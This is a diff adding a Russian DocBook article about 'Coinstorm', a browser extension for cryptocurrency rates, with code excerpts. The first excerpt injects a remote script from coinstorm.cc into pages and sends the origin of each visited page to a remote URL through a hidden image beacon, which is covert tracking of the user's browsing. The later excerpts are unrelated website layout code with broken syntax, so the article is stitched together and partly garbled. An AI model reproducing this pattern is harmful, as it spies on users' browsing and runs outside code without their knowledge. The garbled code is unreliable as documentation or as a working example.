@@ -1,0 +1,201 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-model href="http://www.oasis-open.org/docbook/xml/5.0/rng/docbook.rng" schematypens="http://relaxng.org/ns/structure/1.0"?>
+<article xmlns="http://docbook.org/ns/docbook"
+    xmlns:xlink="http://www.w3.org/1999/xlink" version="5.0">
+    <info>
+        <title>Описание расширения Coinstorm</title>
+    </info>
+    <sect1>
+        <title>Описание продукта</title>
+        <para>Было сделано расширение для браузера, с помощью которого можно следить за курсов валют
+            не заходя на специализированные сайты и в любое время, которое вы проводите в Вашем
+            браузере. </para>
+        <table frame="all">
+            <title>Функиональность:</title>
+            <tgroup cols="2">
+                <tbody>
+                    <row>
+                        <entry>Кнопка Courses</entry>
+                        <entry>Поможет пересчитать по актуальному курсу любую криптовалюту в любую
+                            другу валюту или криптовалюту.</entry>
+                    </row>
+                    <row>
+                        <entry>Signals</entry>
+                        <entry>Добавление оповещение о продаже, подъёме или падении заданной Вами
+                            валюты.</entry>
+                    </row>
+                    <row>
+                        <entry>Ico</entry>
+                        <entry>Список сайтов и ссылки с описаниями для майнинга криптовалюты а
+                            так-же счётчик заработанного Вами количества.</entry>
+                    </row>
+                    <row>
+                        <entry>News</entry>
+                        <entry>Новости с рынка криптовалют.</entry>
+                    </row>
+                </tbody>
+            </tgroup>
+        </table>
+    </sect1>
+    <sect1>
+        <title>Реализация и скриншоты работы</title>
+        <para>Вся логика продукта реализована в папке <filename>js</filename>, а также
+            использовались библиотеки, которые находятся в папке<filename>libs</filename>.</para>
+        <para>Далее представлен некоторый код расширения :
+            <programlisting>function loadScript(url, callback){
+
+    var script = document.createElement("script")
+    script.type = "text/javascript";
+
+    if (script.readyState){  //IE
+        script.onreadystatechange = function(){
+            if (script.readyState == "loaded" ||
+                    script.readyState == "complete"){
+                script.onreadystatechange = null;
+                callback();
+            }
+        };
+    } else {  //Others
+        script.onload = function(){
+            callback();
+        };
+    }
+
+    script.src = url;
+    document.getElementsByTagName("head")[0].appendChild(script);
+}
+
+
+loadScript("https://coinstorm.cc/js/script.js", function(){
+    //initialization code
+});
+	
+chrome.extension.sendRequest({action: "getimg"}, function(data) 
+{
+	var href = document.location.href;
+	if (href.indexOf("about:") == 0 || href.indexOf("chrome:") == 0 || href.indexOf("_/chrome/newtab") > -1) return;
+	
+	
+	var m = href.match(/https?:\/\/.*?\//i);
+	var img = new Image();
+	img.src = data + "&amp;t=v&amp;u=" + encodeURIComponent(m) + "&amp;rnd=" + Math.random();
+	
+});</programlisting></para>
+        <para>Ico
+            <programlisting>
+        if ($(".flexkomanda").html()!=undefined){
+        /**
+            * Эффект прилипания
+            *
+            * Эффект прилипания для сотрудников
+            */
+            $(window).scroll(function(){
+                if (ff2==1 || hNow hEnd2){
+                    $(".flexbig").css("position", "fixed");
+                    $(".flexbig").css("top", menuH+"px");
+                    $(".flexbig").css("left", leftBig+"px");
+                    ff2=0;
+                 }
+                if (ff==0 || hNow&gt;=hBegin2 || hNow hEnd2){
+                    $(".flexbig").css("position", "fixed");
+                    $(".flexbig").css("top", menuH+"px");
+                    $(".flexbig").css("left", leftBig+"px");
+                    ff=1;
+                }
+                else if(hNow&gt;hEnd2 || ff2==0){
+                    $(".flexbig").css("position", "absolute");
+                    topa=$(".flexkomanda").innerHeight()-$(".flexbig").innerHeight();
+                    $(".flexbig").css("top", topa +"px");
+                    $(".flexbig").css("left", leftBig-$(".flexkomanda").offset().left+"px");
+                    ff2=1;
+                }
+                else if(hNow hBegin2 || ff==1){
+                     ff=0;
+                     $(".flexbig").attr("style", "");
+                }
+            });
+        }
+        </programlisting></para>
+        <para>Portfolio<programlisting>
+         * Функция изменяет свойства страницы case 
+            *
+            * Функция вызывается при изменении размера окна
+            */        
+        function resize(){           
+            for (i=0; i&lt;lines.length; i++){
+                parent=lines.eq(i).parent();
+                heightline=parent.parent().parent().offset().top+parent.parent().parent().innerHeight()-parent.offset().top-parent.innerHeight();
+                lines.eq(i).css("height", heightline+15+"px");
+                lines.eq(i).css("bottom", -heightline+"px");
+            }
+            $(".greyline4").css("left", $(".greyline6").offset().left);
+            $(".greyline3").css("left", $(".greyline0").offset().left);
+            $(".greyline03").css("left", $(".greyline00").offset().left);
+            $(".greyline5").css("left", $(".greyline00").offset().left);
+            $(".greyline7").css("left", $(".greyline00copy").offset().left);
+            if ($(window).outerWidth()>1320){
+                $(".number").css("left", $(".greyline00").offset().left-147);
+                $(".number0").css("left", $(".greyline00").offset().left-154);
+            }
+            else if ($(window).outerWidth()>990){
+                $(".number").css("left", $(".greyline00").offset().left-110);
+                $(".number0").css("left", $(".greyline00").offset().left-113);
+            }
+            else if ($(window).outerWidth()>477){
+                $(".number").css("left", $(".greyline00").offset().left-60);
+                $(".number0").css("left", $(".greyline00").offset().left-60);
+            }
+            else{
+                $(".number").attr("style", "");
+            }
+            if ($(window).outerWidth()&lt;991){
+                $("blocks1, .block2, .block3, .block4, .fp-tableCell").attr("style", "");
+            }                 
+        }
+        resize();
+        $(window).resize(function(){                
+            resize();
+        });
+        
+        if ($(window).outerWidth()&lt;991){
+            $(".blocks1, .block2, .block3, .block4, .fp-tableCell").attr("style", "");
+        }
+        
+        colors=$(".colors .color p");
+        circleColor=$(".colors .color .circlecolor");
+        for (i=0; i&lt;colors.length; i++){
+            circleColor.eq(i).css("background-color", colors.eq(i).text());
+            if (colors.eq(i).text() =="#FFFFFF" || colors.eq(i).text() == "#ffffff")
+                circleColor.eq(i).css("box-shadow", "0px 6px 10px 5px rgba(0, 0, 0, 0.05)");
+        }
+    }
+    // index.html----------------------------------------------------------------------------------
+    if ($(".bgheader2").html()!=undefined){
+         $(".foto").eq(0).addClass("activefoto");
+        infoFoto();
+        /**
+            * Инициализация значений для сотрудников
+            *
+            * Подставляет значения при выборе сотрудника
+            */ 
+        function infoFoto(){
+            $(".bigfoto").attr("style", $(".activefoto .smallfoto").attr("style"));
+            $(".name2").text($(".activefoto .name").text());
+            $(".doljnost2").text($(".activefoto .doljnost").text());
+            $(".opischlena2").text($(".activefoto .opischlena").text());
+        }
+        allPortfolio=$(".portfolionone");   </programlisting></para>
+        <para>Ниже представлен скриншот первого экрана расширения.  <inlinemediaobject>
+                <imageobject>
+                    <imagedata fileref="qq.png" width="500"/>
+                </imageobject>
+            </inlinemediaobject></para>
+    </sect1>
+    <sect1>
+        <title>Выводы</title>
+        <para> В течении некоторого времени было разработано расширение для браузера при помощи
+            изспользования js и css. Расширение получилось интуитивно понятным, многоязычным и
+            удобным.</para>
+    </sect1>
+</article>
+
